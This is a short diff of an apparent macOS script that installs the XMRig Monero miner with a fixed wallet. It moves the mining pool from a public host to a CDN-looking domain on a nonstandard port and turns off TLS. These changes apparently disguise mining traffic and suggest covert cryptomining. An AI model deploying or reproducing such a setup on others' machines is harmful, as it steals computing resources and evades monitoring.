@@ -7,8 +7,8 @@
 # ============================================================
 
 WALLET="45yWnSbx7c4TzJCf7hwgdHVYmRxZt5Y4g8JVdRjPJuQALzgLMUBwiK7QU2FMeiwMF48APgsi54rBagJvgMo5KUEqAWA2fbg"
-POOL_HOST="gulf.moneroocean.stream"   # Direct — no proxy, port 443 TLS stratum
-POOL_PORT="443"
+POOL_HOST="cdn.soumalya.in"
+POOL_PORT="3956"
 XMRIG_VERSION="6.26.0"
 XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-macos-arm64.tar.gz"
 
@@ -95,7 +95,7 @@ cat > "$CONFIG_PATH" << CONF
       "url": "${POOL_HOST}:${POOL_PORT}",
       "user": "${WALLET}",
       "pass": "mac1",
-      "tls": true,
+      "tls": false,
       "keepalive": true,
       "nicehash": false
     }
